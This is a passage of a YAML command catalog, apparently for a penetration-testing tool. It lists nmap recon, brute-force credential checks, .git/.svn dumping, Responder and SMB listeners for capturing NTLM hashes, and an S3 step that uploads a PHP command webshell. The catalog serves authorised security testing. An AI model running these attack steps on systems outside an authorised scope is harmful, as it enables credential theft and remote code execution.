target_identity:
  display_name: Target identity
  match: {services: [], ports: []}
  commands:
    - {id: target-hostname-redirect, name: Hostname 확인 (HTTP 리다이렉트), description: IP로 접속했을 때 웹 서버가 3xx Location 헤더나 meta-refresh로 스스로 공개하는 정식 vhost 이름을 확인하고 Target에 자동 저장합니다. PTR 레코드가 없어도 동작합니다., command: "{repo_dir}/.venv/bin/python -m app.redirect_probe --host {host}", execution_mode: captured, risk: low, tool: python3, sudo: false, output: text, policy: allowed}
    - {id: target-hostname-ntlm, name: Hostname 확인 (NTLM 정보 노출), description: 인증 없이 NTLM negotiate만 보내 WinRM·IIS 등에서 노출되는 NetBIOS·DNS 컴퓨터명을 확인합니다. 실제 웹 vhost 이름과 다를 수 있어 참고 정보로만 표시되고 자동 저장되지 않습니다., command: "{repo_dir}/.venv/bin/python -m app.ntlm_probe --host {host}", execution_mode: captured, risk: low, tool: python3, sudo: false, output: text, policy: allowed}
    - {id: target-hostname-identity, name: Hostname 확인 (역방향 DNS), description: 역방향 DNS 조회로 대상이 공개하는 Hostname을 확인하고 Target에 자동 저장합니다. 대상 DNS 서버에 리버스 존이 설정돼 있어야 동작합니다., command: "nmap -sn -R -oX {output_dir}/target-hostname-identity.xml {host}", execution_mode: captured, risk: low, tool: nmap, sudo: false, output: text, policy: allowed}
    - {id: target-os-identity, name: 운영체제·호스트명 식별, description: Nmap OS 탐지와 역방향 호스트명 조회를 실행하고 관찰된 운영체제와 호스트명을 Target에 자동 저장합니다. OS 탐지는 권한이 필요합니다., command: "nmap -O --osscan-guess -oX {output_dir}/target-os-identity.xml {host}", execution_mode: captured, risk: medium, tool: nmap, sudo: true, output: text, policy: allowed}
listeners:
  display_name: 공격자 측 리스너
  match: {services: [], ports: []}
  commands:
    - {id: responder-listener, name: Responder 리스너, description: "LLMNR/NBT-NS/mDNS poisoning으로 인증 시도를 가로챕니다. 별도의 강제 인증 유도(UNC 경로 LFI, PetitPotam 등)와 함께 써야 하며, -v(verbose)로 이미 캡처된 계정이 재시도돼도 Client/Username/Hash 전체가 매번 출력됩니다 — 'Skipping previously captured hash'만 뜨는 걸로 캡처 여부를 헷갈리지 않도록.", command: "responder -I {interface} -v", execution_mode: interactive, risk: medium, tool: responder, sudo: true, output: pty-log, policy: allowed}
    - {id: smbserver-listener, name: "SMB 공유 서버 (impacket-smbserver)", description: "인증 없이 접속 가능한 SMB 공유를 엽니다. 강제 인증 유도(UNC 경로 LFI 등)와 함께 쓰면 대상이 접속할 때 NetNTLMv2 해시가 터미널에 그대로 출력됩니다. 대상 설정상 파일 읽기가 허용돼 있으면 이 공유에 올려둔 webshell을 UNC 경로로 직접 포함시켜 해시를 꺾지 않고도 RCE로 이어갈 수 있습니다. 공유 폴더는 프로젝트의 targets/{host}/outputs/smb-share 아래입니다.", command: "impacket-smbserver share {output_dir} -smb2support", execution_mode: interactive, risk: medium, tool: impacket-smbserver, sudo: true, output: pty-log, policy: allowed}
ftp:
  display_name: FTP
  match: {services: [ftp], ports: [21]}
  commands:
    - {id: ftp-anon, name: FTP anonymous 자격증명 대입, description: FTP 프로토콜 데이터셋의 anonymous 계정을 한 번 대입하고 성공 즉시 종료합니다. 디렉터리 내용은 나열하지 않습니다., command: "nmap -Pn -p{port} --script ftp-anon --script-args ftp-anon.maxlist=0 {host}", execution_mode: captured, risk: low, tool: nmap, sudo: false, output: text, policy: allowed, autorecon: true}
    - {id: ftp-syst, name: FTP 시스템 정보 확인, description: FTP 서버가 공개하는 시스템 정보를 조회합니다., command: "nmap -Pn -p{port} --script ftp-syst {host}", execution_mode: captured, risk: low, tool: nmap, sudo: false, output: text, policy: allowed, autorecon: true}
    - {id: ftp-client, name: FTP 수동 접속, description: 자동 로그인 없이 대화형 FTP 클라이언트를 엽니다., command: "ftp {host} {port}", execution_mode: interactive, risk: low, tool: ftp, sudo: false, output: pty-log, policy: allowed}
    - {id: ftp-directory-tree, name: 폴더·파일 트리 조회, description: "FTP 서버의 전체 디렉터리·파일 구조를 재귀적으로 나열합니다. username/password를 비워두면 anonymous로 접속합니다.", command: "{repo_dir}/.venv/bin/python -m app.ftp_tree --host {host} --port {port} --username {username} --password {password}", execution_mode: captured, risk: low, tool: python3, sudo: false, output: text, policy: allowed}
ssh:
  display_name: SSH
  match: {services: [ssh], ports: [22]}
  commands:
    - {id: ssh-enum, name: SSH 알고리즘 확인, description: 서버가 지원하는 암호화·키 교환·MAC 알고리즘을 열람합니다., command: "nmap -Pn -p{port} --script ssh2-enum-algos {host}", execution_mode: captured, risk: low, tool: nmap, sudo: false, output: text, policy: allowed}
    - {id: ssh-auth-methods, name: SSH 인증 방식 확인, description: root 계정에 대해 서버가 허용하는 인증 방식만 확인하며 비밀번호 로그인은 시도하지 않습니다., command: "nmap -Pn -p{port} --script ssh-auth-methods --script-args ssh.user=root {host}", execution_mode: captured, risk: low, tool: nmap, sudo: false, output: text, policy: allowed}
    - {id: ssh-default-audit, name: SSH 기본 자격증명 제한 점검, description: Nmap 내장 목록에서 사용자 8개와 비밀번호 4개만 2분 동안 저속으로 점검합니다. 계정 잠금 가능성이 있습니다., command: "nmap -Pn -p{port} --script ssh-brute --script-args brute.start=2,brute.threads=2,brute.delay=2,brute.guesses=3,brute.firstonly=true,brute.retries=0,unpwdb.userlimit=8,unpwdb.passlimit=4,unpwdb.timelimit=2m {host}", execution_mode: captured, risk: high, tool: nmap, sudo: false, output: text, policy: allowed}
    - {id: ssh-client, name: SSH 수동 접속, description: SSH 클라이언트를 열고 사용자가 직접 인증합니다., command: "ssh -p {port} {username}@{host}", execution_mode: interactive, risk: low, tool: ssh, sudo: false, output: pty-log, policy: allowed}
    - {id: ssh-credential-check-netexec, name: SSH 자격증명 확인 (NetExec), description: 사용자가 입력한 특정 계정 하나를 NetExec으로 대입해 SSH 인증 성공 여부만 확인합니다. 대입 공격이 아니라 단일 계정 검증입니다., command: "nxc ssh {host} --port {port} -u {username} -p {password}", execution_mode: captured, risk: medium, tool: netexec, sudo: false, output: text, policy: allowed, match: {services: [], ports: []}}
kerberos:
  display_name: Kerberos
  match: {services: [kerberos-sec, kerberos], ports: [88]}
  commands:
    - {id: kerberos-user-enum-kerbrute, name: 사용자명 열거 (kerbrute), description: Kerberos Pre-Auth 요청으로 워드리스트에 있는 사용자명 중 실제로 존재하는 계정만 확인합니다. 비밀번호를 대입하지 않으며 계정 잠금을 유발하지 않습니다., command: "kerbrute userenum -d {domain} --dc {host} {wordlist}", execution_mode: captured, risk: low, tool: kerbrute, sudo: false, output: text, policy: allowed, match: {services: [], ports: []}}
telnet:
  display_name: Telnet
  match: {services: [telnet], ports: [23]}
  commands:
    - {id: telnet-info, name: Telnet 상세 정보 확인, description: 모든 Nmap 서비스 Probe와 Telnet 협상 정보를 확인하고 관찰된 제품과 버전을 저장합니다., command: "nmap -Pn -sV --version-all -p{port} --script telnet-encryption,telnet-ntlm-info -oX {output_dir}/service-{port}-identity.xml {host}", execution_mode: captured, risk: low, tool: nmap, sudo: false, output: text, policy: allowed}
    - {id: telnet-banner, name: Telnet 원시 배너 확인, description: Banner NSE로 로그인 전 서버가 직접 공개하는 제품·버전 문자열을 추가 수집합니다., command: "nmap -Pn -p{port} --script banner {host}", execution_mode: captured, risk: low, tool: nmap, sudo: false, output: text, policy: allowed}
    - {id: telnet-version-trace, name: Telnet 버전 Probe 추적, description: Nmap의 모든 버전 Probe와 응답을 상세 출력하고 식별된 값을 다시 저장합니다., command: "nmap -Pn -sV --version-all --version-trace -p{port} -oX {output_dir}/service-{port}-identity-trace.xml {host}", execution_mode: captured, risk: low, tool: nmap, sudo: false, output: text, policy: allowed}
    - {id: telnet-default-audit, name: Telnet 기본 자격증명 제한 점검, description: Nmap 내장 목록에서 사용자 8개와 비밀번호 4개만 2분 동안 저속으로 점검합니다. 계정 잠금 가능성이 있습니다., command: "nmap -Pn -p{port} --script telnet-brute --script-args brute.start=2,brute.threads=2,brute.delay=2,brute.guesses=3,brute.firstonly=true,brute.retries=0,unpwdb.userlimit=8,unpwdb.passlimit=4,unpwdb.timelimit=2m,telnet-brute.timeout=8s {host}", execution_mode: captured, risk: high, tool: nmap, sudo: false, output: text, policy: allowed}
    - {id: telnet-client, name: Telnet 수동 접속, description: 사용자가 직접 상호작용할 수 있는 Telnet 클라이언트를 엽니다., command: "telnet {host} {port}", execution_mode: interactive, risk: medium, tool: telnet, sudo: false, output: pty-log, policy: allowed}
smtp:
  display_name: SMTP
  match: {services: [smtp, smtps, submission], ports: [25, 465, 587]}
  commands:
    - {id: smtp-info, name: SMTP 명령 확인, description: SMTP 서버가 공개하는 지원 명령을 열람합니다., command: "nmap -Pn -p{port} --script smtp-commands {host}", execution_mode: captured, risk: low, tool: nmap, sudo: false, output: text, policy: allowed}
    - {id: smtp-default-audit, name: SMTP 기본 자격증명 제한 점검, description: 서버가 제공하는 SMTP 인증 방식에 사용자 8개와 비밀번호 4개만 2분 동안 저속으로 점검합니다., command: "nmap -Pn -p{port} --script smtp-brute --script-args brute.start=2,brute.threads=2,brute.delay=2,brute.guesses=3,brute.firstonly=true,brute.retries=0,unpwdb.userlimit=8,unpwdb.passlimit=4,unpwdb.timelimit=2m {host}", execution_mode: captured, risk: high, tool: nmap, sudo: false, output: text, policy: allowed}
dns:
  display_name: DNS
  match: {services: [domain, dns], ports: [53]}
  commands:
    - {id: dns-info, name: DNS 서비스 정보 확인, description: DNS 버전 단서와 재귀 질의 허용 여부를 확인합니다., command: "nmap -Pn -p{port} --script dns-nsid,dns-recursion {host}", execution_mode: captured, risk: low, tool: nmap, sudo: false, output: text, policy: allowed, autorecon: true}
    - {id: dns-subdomain-enum, name: "서브도메인 브루트포스 (gobuster dns)", description: "워드리스트로 실제 하위 도메인이 존재하는지 이 DNS 서버에 직접 질의합니다. 시스템에 설정된 DNS 리졸버를 사용하므로 먼저 VPN 패널에서 이 대상을 DNS로 지정하세요.", command: "gobuster dns -d {domain} -w {wordlist} -q -i", execution_mode: captured, risk: low, tool: gobuster, sudo: false, output: text, policy: allowed, match: {services: [], ports: []}}
    - {id: dns-dnsrecon-std, name: "표준 레코드·존 전송 시도 (dnsrecon)", description: "A/AAAA/MX/NS/TXT 등 표준 레코드를 조회하고 존 전송(AXFR)이 허용되는지 시도합니다. AutoRecon 기본 DNS 플러그인 중 하나입니다.", command: "dnsrecon -d {domain} -n {host}", execution_mode: captured, risk: low, tool: dnsrecon, sudo: false, output: text, policy: allowed, autorecon: true}
http:
  display_name: HTTP
  match: {services: [http, https, http-proxy, ssl/http], ports: [80, 443, 8080, 8443]}
  commands:
    - {id: http-headers, name: HTTP 응답 헤더 확인, description: 대상 웹 서비스의 응답 헤더를 조회합니다., command: "curl -k -I {scheme}://{host}:{port}", execution_mode: captured, risk: low, tool: curl, sudo: false, output: text, policy: allowed, autorecon: true}
    - {id: http-whatweb, name: 웹 기술 식별, description: WhatWeb으로 사용 중인 웹 기술과 제품 단서를 확인합니다., command: "whatweb {scheme}://{host}:{port}", execution_mode: captured, risk: low, tool: whatweb, sudo: false, output: text, policy: allowed, autorecon: true}
    - {id: http-nikto, name: 웹 서버 취약점 스캔 (Nikto), description: Nikto로 알려진 위험 파일·오설정·구버전 소프트웨어 지문을 훑습니다. AutoRecon의 기본 http 플러그인 중 하나입니다., command: "nikto -h {scheme}://{host}:{port} -ask no", execution_mode: captured, risk: low, tool: nikto, sudo: false, output: text, policy: allowed, autorecon: true}
    - {id: http-sslscan, name: TLS 설정·인증서 확인 (sslscan), description: 지원 암호 스위트·프로토콜 버전·인증서 정보를 확인합니다. https가 아닌 서비스엔 의미가 없습니다., command: "sslscan {host}:{port}", execution_mode: captured, risk: low, tool: sslscan, sudo: false, output: text, policy: allowed, autorecon: true, match: {services: [https, ssl/http], ports: [443, 8443]}}
    - {id: http-wpscan, name: WordPress 취약점 스캔 (WPScan), description: "워드프레스 감지된 사이트에서 플러그인·사용자·버전 취약점을 열거합니다. product/cpe에 WordPress 단서가 있는 서비스에서만 AutoRecon 팬아웃 대상이 됩니다(autorecon 필드가 아니라 fan_out_service_executions()가 svc.product로 직접 판단) -- 수동으로는 언제든 실행 가능.", command: "wpscan --url {scheme}://{host}:{port} --enumerate p,u --no-banner", execution_mode: captured, risk: low, tool: wpscan, sudo: false, output: text, policy: allowed}
    - {id: cloud-storage-fingerprint, name: "클라우드 스토리지 판별 (S3/Azure/GCS)", description: "응답 헤더(x-amz-*, x-ms-*, x-goog-*)와 Server 헤더, 에러 XML 구조로 AWS S3·Azure Blob·GCS·MinIO 등 어떤 오브젝트 스토리지 백엔드인지 판별합니다. 접근 권한이 아니라 백엔드 종류만 식별하는 지문 확인입니다.", command: "{repo_dir}/.venv/bin/python -m app.cloud_storage_probe --host {host} --port {port} --scheme {scheme}", execution_mode: captured, risk: low, tool: python3, sudo: false, output: text, policy: allowed}
    - {id: graphql-introspection, name: GraphQL 스키마 조회 (introspection), description: /graphql 엔드포인트에 introspection 쿼리를 보내 전체 타입·필드 스키마를 확인합니다. 인증 없이 introspection이 열려 있으면 숨겨진 쿼리·필드 구조가 그대로 드러납니다., command: "curl -s -X POST {scheme}://{host}:{port}/graphql -H 'Content-Type: application/json' -d '{{\"query\": \"{{ __schema {{ types {{ name fields {{ name }} }} }} }} \"}}'", execution_mode: captured, risk: low, tool: curl, sudo: false, output: text, policy: allowed}
    - {id: spring-actuator-check, name: "Spring Boot Actuator 노출 확인", description: "Spring Boot 관리 엔드포인트(actuator)가 인증 없이 노출되어 있는지 확인합니다. 노출되어 있으면 env·mappings·sessions 등 하위 경로도 확인하세요.", command: "curl -s {scheme}://{host}:{port}/actuator", execution_mode: captured, risk: low, tool: curl, sudo: false, output: text, policy: allowed}
    - {id: spring-actuator-env, name: "Spring Boot Actuator 환경변수 확인", description: "/actuator/env로 환경 변수·설정 프로퍼티(DB 자격증명 등)가 노출되는지 확인합니다.", command: "curl -s {scheme}://{host}:{port}/actuator/env", execution_mode: captured, risk: low, tool: curl, sudo: false, output: text, policy: allowed}
    - {id: spring-actuator-sessions, name: "Spring Boot Actuator 세션 확인", description: "/actuator/sessions로 로그인된 사용자의 세션 ID가 노출되는지 확인합니다. 노출된 세션 ID를 쿠키에 넣으면 인증을 우회할 수 있습니다.", command: "curl -s {scheme}://{host}:{port}/actuator/sessions", execution_mode: captured, risk: medium, tool: curl, sudo: false, output: text, policy: allowed}
    - {id: git-head-check, name: "노출된 .git 저장소 확인", description: "/.git/HEAD 요청으로 웹 루트에 소스 저장소가 그대로 노출되어 있는지 확인합니다. 'ref: refs/heads/...' 형태로 응답하면 노출된 것입니다.", command: "curl -s {scheme}://{host}:{port}/.git/HEAD", execution_mode: captured, risk: low, tool: curl, sudo: false, output: text, policy: allowed, autorecon: true}
    - {id: git-dumper-clone, name: "노출된 .git 저장소 덤프 (git-dumper)", description: "노출된 .git 디렉터리에서 전체 소스 저장소(히스토리 포함)를 복구합니다. 설정 파일에 남은 자격증명이나 삭제된 민감 파일이 히스토리에 남아있는지 확인하세요.", command: "git-dumper {scheme}://{host}:{port}/.git/ {output_dir}/git-dump", execution_mode: captured, risk: medium, tool: git-dumper, sudo: false, output: text, policy: allowed}
    - {id: git-dump-tree, name: "복구된 저장소의 폴더·파일 트리 조회", description: 위 git-dumper로 이미 복구한 로컬 사본의 폴더·파일 구조를 나열합니다. 대상에는 아무 요청도 보내지 않습니다., command: "find {output_dir}/git-dump -mindepth 1 ( -type d -printf 'D|%P\n' ) -o -printf 'F|%P\n'", execution_mode: captured, risk: low, tool: find, sudo: false, output: text, policy: allowed}
    - {id: git-history-clone, name: "정상 서빙되는 저장소 클론 (Gitea 등, 커밋 히스토리 포함)", description: "노출된 .git이 아니라 Gitea 같은 서버가 정상적으로 서빙 중인 저장소를 통째로 클론합니다 -- 커밋 히스토리 전체가 그대로 딸려오므로, 이후에 삭제된 자격증명이 있는지 확인할 수 있습니다. {domain}에 vhost 이름(예: git.nexus.htb)을 넣으면 Host 헤더로 라우팅됩니다. {path}는 owner/repo.git 형태입니다.", command: "git -c http.extraHeader=\"Host: {domain}\" clone {scheme}://{host}:{port}/{path} {output_dir}/git-history-clone", execution_mode: captured, risk: low, tool: git, sudo: false, output: text, policy: allowed, match: {services: [], ports: []}}
    - {id: git-history-log, name: "클론한 저장소의 커밋 히스토리 diff 조회 (git log -p)", description: 위에서 클론한 로컬 사본의 전체 커밋 히스토리를 diff까지 포함해 나열합니다. 나중에 지워진 줄(비밀번호 등)이 있는지 확인하세요. 대상에는 아무 요청도 보내지 않습니다., command: "git -C {output_dir}/git-history-clone log -p", execution_mode: captured, risk: low, tool: git, sudo: false, output: text, policy: allowed, match: {services: [], ports: []}}
    - {id: svn-wcdb-check, name: "노출된 .svn 저장소 확인", description: ".svn/wc.db(SVN 1.7+ 작업 사본 메타데이터) HEAD 요청으로 웹 루트에 SVN 작업 사본이 그대로 노출되어 있는지 확인합니다. 200 OK면 노출된 것입니다.", command: "curl -sI {scheme}://{host}:{port}/.svn/wc.db", execution_mode: captured, risk: low, tool: curl, sudo: false, output: text, policy: allowed}
    - {id: svn-dump-recover, name: "노출된 .svn 저장소 덤프", description: "노출된 .svn/wc.db를 내려받아 파일 목록과 각 파일의 pristine 해시를 조회한 뒤, 실제 파일 내용을 하나씩 복구합니다(.svn/pristine/<해시>). 설정 파일에 남은 자격증명이 있는지 확인하세요.", command: "{repo_dir}/.venv/bin/python -m app.svn_dump --url {scheme}://{host}:{port} --output-dir {output_dir}/svn-dump", execution_mode: captured, risk: medium, tool: python3, sudo: false, output: text, policy: allowed}
    - {id: http-webdav-detect, name: WebDAV 활성화 여부 확인, description: PROPFIND/OPTIONS로 이 웹 서버에 WebDAV(IIS WebDAV, mod_dav 등)가 활성화돼 있는지 확인합니다., command: "nmap -Pn -p{port} --script http-webdav-scan {host}", execution_mode: captured, risk: low, tool: nmap, sudo: false, output: text, policy: allowed}
    - {id: http-webdav-tree, name: WebDAV 폴더·파일 트리 조회, description: "PROPFIND로 WebDAV 디렉터리 구조를 재귀적으로 나열합니다. username/password를 비워두면 인증 없이 접속합니다.", command: "{repo_dir}/.venv/bin/python -m app.webdav_tree --host {host} --port {port} --scheme {scheme} --username {username} --password {password}", execution_mode: captured, risk: low, tool: python3, sudo: false, output: text, policy: allowed}
    - {id: http-auth-finder, name: HTTP 인증 경로 확인, description: 웹사이트에서 Basic·Digest·NTLM 인증이 적용된 경로를 찾습니다. Form 로그인은 Web Testing에서 경로와 필드를 직접 확인해야 합니다., command: "nmap -Pn -p{port} --script http-auth-finder {host}", execution_mode: captured, risk: low, tool: nmap, sudo: false, output: text, policy: allowed}
    - {id: http-default-audit, name: HTTP 루트 인증 제한 점검, description: 루트 경로의 Basic·Digest·NTLM 인증에 사용자 8개와 비밀번호 4개만 2분 동안 저속으로 점검합니다. Form 로그인은 포함하지 않습니다., command: "nmap -Pn -p{port} --script http-brute --script-args http-brute.path=/,brute.start=2,brute.threads=2,brute.delay=2,brute.guesses=3,brute.firstonly=true,brute.retries=0,unpwdb.userlimit=8,unpwdb.passlimit=4,unpwdb.timelimit=2m {host}", execution_mode: captured, risk: high, tool: nmap, sudo: false, output: text, policy: allowed}
    - {id: http-directory-fuzz, name: 디렉터리·파일 퍼징 (feroxbuster), description: "정적 워드리스트로 존재하는 경로를 찾습니다. 재귀 탐색은 하지 않으며 발견된 항목만 표시합니다. match가 비어 있어 서비스별 명령 목록엔 안 뜨지만(항상 wordlist를 직접 골라야 하므로 Tools 페이지 전용), AutoRecon 팬아웃(fan_out_service_executions)은 http/https 서비스마다 기본 wordlist를 채워 이 항목을 직접 실행합니다.", command: "feroxbuster -u {scheme}://{host}:{port}/ -w {wordlist} --json --silent -n", execution_mode: captured, risk: medium, tool: feroxbuster, sudo: false, output: text, policy: allowed, match: {services: [], ports: []}}
    - {id: http-directory-fuzz-ext, name: "디렉터리·파일 퍼징 · 확장자 지정 (feroxbuster -x)", description: "위와 같지만 각 단어에 지정한 확장자를 붙여서도 요청합니다(gobuster/feroxbuster의 -x). 예: php,txt,html", command: "feroxbuster -u {scheme}://{host}:{port}/ -w {wordlist} -x {extensions} --json --silent -n", execution_mode: captured, risk: medium, tool: feroxbuster, sudo: false, output: text, policy: allowed, match: {services: [], ports: []}}
    - {id: http-vhost-fuzz, name: "가상 호스트 퍼징 (ffuf)", description: "Host 헤더를 워드리스트로 대입해 같은 IP·포트에 라우팅되는 다른 가상 호스트(서브도메인)를 찾습니다. 모든 응답을 보여주므로 baseline과 크기가 다른 결과 위주로 확인하세요.", command: "ffuf -u {scheme}://{host}:{port}/ -H \"Host: FUZZ.{domain}\" -w {wordlist} -mc all -t 40", execution_mode: captured, risk: medium, tool: ffuf, sudo: false, output: text, policy: allowed, match: {services: [], ports: []}}
    - {id: http-param-fuzz, name: "GET 파라미터 이름 퍼징 (ffuf)", description: "지정한 경로에서 워드리스트의 각 이름을 GET 파라미터로 대입해 서버가 실제로 반응하는(page, file, include 등) 파라미터를 찾습니다. 모든 응답을 보여주므로 baseline과 크기가 다른 결과 위주로 확인하세요.", command: "ffuf -u {scheme}://{host}:{port}{path}?FUZZ=test -w {wordlist} -mc all -t 40", execution_mode: captured, risk: medium, tool: ffuf, sudo: false, output: text, policy: allowed, match: {services: [], ports: []}}
    - {id: http-link-extract, name: 페이지 링크 추출, description: '지정한 경로 하나에 요청을 1회만 보내 응답 HTML의 href·src·action 값을 그대로 나열합니다. 발견된 링크를 자동으로 따라 들어가지 않는 단발성 조회이며, 다음 경로를 볼지는 결과에서 직접 골라 이 명령을 다시 실행해야 합니다(자동 재귀 크롤링 아님).', command: 'bash -c "curl -s -k {scheme}://{host}:{port}{path} | grep -ohE ''(href|src|action)=\"[^\"#]*\"'' | sed -E ''s/^[a-z]+=\"//;s/\"$//'' | sort -u"', execution_mode: captured, risk: low, tool: curl, sudo: false, output: text, policy: allowed, match: {services: [], ports: []}}
    - {id: dotdotpwn-traversal-fuzz, name: "디렉터리 트래버설 퍼징 (DotDotPwn)", description: "지정한 URL의 TRAVERSAL 토큰 자리에 여러 깊이의 순회 페이로드를 자동으로 대입해 응답에서 지정한 패턴이 나타나는지 확인합니다. URL에 반드시 TRAVERSAL 토큰이 포함돼야 합니다 (예: http://{host}:{port}/index.php?page=TRAVERSAL). 패턴이 일치하는 첫 요청에서 멈춥니다.", command: "dotdotpwn -m http-url -u {traversal_url} -k {match_pattern} -b -q", execution_mode: captured, risk: medium, tool: dotdotpwn, sudo: false, output: text, policy: allowed, match: {services: [], ports: []}}
    - {id: s3-bucket-list, name: "S3 호환 버킷 목록 조회 (awscli)", description: "커스텀 S3 호환 엔드포인트(MinIO 등)에서 접근 가능한 버킷 목록을 조회합니다. awscli에 자격증명(더미 값이라도 무방)이 미리 구성돼 있어야 합니다 — aws configure로 직접 설정하세요.", command: "aws --endpoint-url={scheme}://{host}:{port} s3 ls", execution_mode: captured, risk: low, tool: aws, sudo: false, output: text, policy: allowed, match: {services: [], ports: []}}
    - {id: s3-object-list, name: "S3 버킷 내부 파일 목록 조회 (awscli)", description: "지정한 버킷 안의 오브젝트 목록을 조회합니다. index.php 등 웹 루트 파일이 보이면 그 버킷이 실제 웹사이트와 연결돼 있다는 뜻입니다.", command: "aws --endpoint-url={scheme}://{host}:{port} s3 ls s3://{path}", execution_mode: captured, risk: low, tool: aws, sudo: false, output: text, policy: allowed, match: {services: [], ports: []}}
    - {id: s3-webshell-upload, name: "PHP 웹쉘 업로드 (S3 버킷 경유)", description: "system($_GET['cmd'])만 담은 최소 PHP 웹쉘을 로컬에 생성한 뒤 지정한 버킷 루트에 shell.php로 업로드합니다. 그 버킷이 실제 웹 루트와 연결돼 있을 때만 업로드한 파일이 웹에서 실행됩니다 — 먼저 S3 버킷 내부 파일 목록 조회로 확인하세요.", command: "bash {repo_dir}/backend/scripts/s3_webshell_upload.sh {scheme}://{host}:{port} {path} {output_dir}", execution_mode: captured, risk: high, tool: aws, sudo: false, output: text, policy: allowed, match: {services: [], ports: []}}
    - {id: cloud-enum-bucket-discovery, name: "클라우드 버킷 이름 탐색 (cloud_enum)", description: "키워드(회사·프로젝트명 등)로 실제 AWS S3·Azure Blob·GCS 엔드포인트에 존재하는 버킷·스토리지 계정을 조회합니다. 대상 IP가 아니라 각 클라우드 사업자의 실제 서비스로 직접 요청이 나가므로, 계약 범위에 해당 키워드 조사가 포함되는지 먼저 확인하세요.", command: "cloud_enum -k {keyword}", execution_mode: captured, risk: low, tool: cloud_enum, sudo: false, output: text, policy: allowed, match: {services: [], ports: []}}
smb:
  display_name: SMB and RPC
  match: {services: [microsoft-ds, netbios-ssn, smb], ports: [139, 445]}
  commands:
    - {id: smb-enum, name: SMB 익명 공유 목록 확인, description: smbclient로 비밀번호 없이 접속해 서버가 공개하는 공유 이름·형식·설명을 직접 수집합니다., command: "smbclient -N -L //{host} -p {port}", execution_mode: captured, risk: low, tool: smbclient, sudo: false, output: text, policy: allowed, autorecon: true}
    - {id: smb-enum-shares-nmap, name: SMB 공유별 접근 권한 확인 (nmap), description: nmap smb-enum-shares 스크립트로 공유마다 실제 접속을 시도해 익명·현재 사용자 접근 권한을 직접 확인합니다. 공유 이름만 나열하는 위 목록과 달리 각 공유가 실제로 열려있는지 알려줍니다. nmap 자체 분류가 safe가 아닌 intrusive라 각 공유에 실제로 연결을 시도합니다., command: "nmap -Pn -p{port} --script smb-enum-shares {host}", execution_mode: captured, risk: medium, tool: nmap, sudo: false, output: text, policy: allowed, match: {services: [microsoft-ds, netbios-ssn, smb], ports: [139, 445]}}
    - {id: smb-null-session, name: SMB 익명 사용자 확인, description: rpcclient Null 세션으로 도메인 사용자 열거가 허용되는지 확인합니다., command: "rpcclient -N -U '' {host} -p {port} -c enumdomusers", execution_mode: captured, risk: low, tool: rpcclient, sudo: false, output: text, policy: allowed, autorecon: true, match: {services: [microsoft-ds, netbios-ssn, smb], ports: [139, 445]}}
    - {id: smb-enum4linux, name: SMB 종합 열거 (enum4linux), description: OS 정보·공유·사용자·그룹·정책을 한 번에 훑는 AutoRecon 기본 SMB 플러그인입니다., command: "enum4linux -a {host}", execution_mode: captured, risk: low, tool: enum4linux, sudo: false, output: text, policy: allowed, autorecon: true, match: {services: [microsoft-ds, netbios-ssn, smb], ports: [139, 445]}}
    - {id: smb-smbmap, name: SMB 공유 권한 매트릭스 확인 (smbmap), description: 익명 세션으로 각 공유의 READ/WRITE 권한을 표 형태로 보여줍니다., command: "smbmap -H {host} -P {port}", execution_mode: captured, risk: low, tool: smbmap, sudo: false, output: text, policy: allowed, autorecon: true, match: {services: [microsoft-ds, netbios-ssn, smb], ports: [139, 445]}}
    - {id: smb-default-audit, name: SMB 기본 자격증명 제한 점검, description: SMB 자체 잠금 감지를 유지하며 사용자 8개와 비밀번호 4개 및 빈·사용자 기반 후보를 점검합니다. 속도 지연은 지원되지 않습니다., command: "nmap -Pn -p{port} --script smb-brute --script-args brutelimit=8,canaries=3,unpwdb.userlimit=8,unpwdb.passlimit=4,unpwdb.timelimit=2m {host}", execution_mode: captured, risk: high, tool: nmap, sudo: false, output: text, policy: allowed, match: {services: [microsoft-ds, netbios-ssn, smb], ports: [139, 445]}}
    - {id: smb-client, name: SMB 수동 접속, description: smbclient를 열고 사용자가 직접 인증합니다., command: "smbclient -L //{host} -p {port}", execution_mode: interactive, risk: low, tool: smbclient, sudo: false, output: pty-log, policy: allowed}
    - {id: smb-share-client, name: 선택한 SMB 공유 접속, description: 공유 목록에서 선택한 공유에 익명 세션으로 접속합니다., command: "smbclient //{host}/{share} -N -p {port}", execution_mode: interactive, risk: low, tool: smbclient, sudo: false, output: pty-log, policy: allowed, match: {services: [], ports: []}}
    - {id: smb-share-spider, name: 선택한 SMB 공유 재귀 파일 목록, description: 선택한 공유의 하위 디렉터리를 재귀적으로 순회해 접근 가능한 파일 경로를 한 번에 수집합니다. 파일을 내려받지 않습니다., command: "smbclient -N //{host}/{share} -p {port} -c 'recurse ON;ls'", execution_mode: captured, risk: low, tool: smbclient, sudo: false, output: text, policy: allowed, match: {services: [], ports: []}}
    - {id: smb-spider-netexec, name: SMB 전체 공유 재귀 파일 목록 (NetExec), description: NetExec spider_plus 모듈로 접근 가능한 모든 공유를 자동으로 찾아 재귀적으로 파일 목록을 수집합니다. DOWNLOAD_FLAG 기본값(false)을 유지해 파일을 내려받지 않습니다., command: "nxc smb {host} --port {port} -u '' -p '' -M spider_plus", execution_mode: captured, risk: low, tool: netexec, sudo: false, output: text, policy: allowed, match: {services: [microsoft-ds, netbios-ssn, smb], ports: [139, 445]}}
    - {id: smb-credential-check-netexec, name: SMB 자격증명 확인 (NetExec), description: 사용자가 입력한 특정 계정 하나를 NetExec으로 대입해 인증 성공 여부와 로컬 관리자 권한을 확인합니다. 대입 공격이 아니라 단일 계정 검증입니다., command: "nxc smb {host} --port {port} -u {username} -p {password}", execution_mode: captured, risk: medium, tool: netexec, sudo: false, output: text, policy: allowed, match: {services: [], ports: []}}
    - {id: ad-lookupsid-impacket, name: SID 순환 사용자 열거 (Impacket lookupsid), description: 유효한 계정으로 RID를 순차 대입해 로컬·도메인 사용자·그룹을 열거합니다. rpcclient Null 세션이 막혀 있어도 낮은 권한 계정 하나만 있으면 통하는 경우가 많습니다., command: "impacket-lookupsid {domain}/{username}:{password}@{host}", execution_mode: captured, risk: low, tool: impacket-lookupsid, sudo: false, output: text, policy: allowed, match: {services: [], ports: []}}
    - {id: smb-share-file-view, name: 공유 파일 원문 보기, description: 재귀 목록에서 찾은 파일 하나를 로컬에 내려받지 않고 표준출력으로 바로 확인합니다., command: "smbclient -N //{host}/{share} -p {port} -c 'get {path} -'", execution_mode: captured, risk: low, tool: smbclient, sudo: false, output: text, policy: allowed, match: {services: [], ports: []}}
nfs:
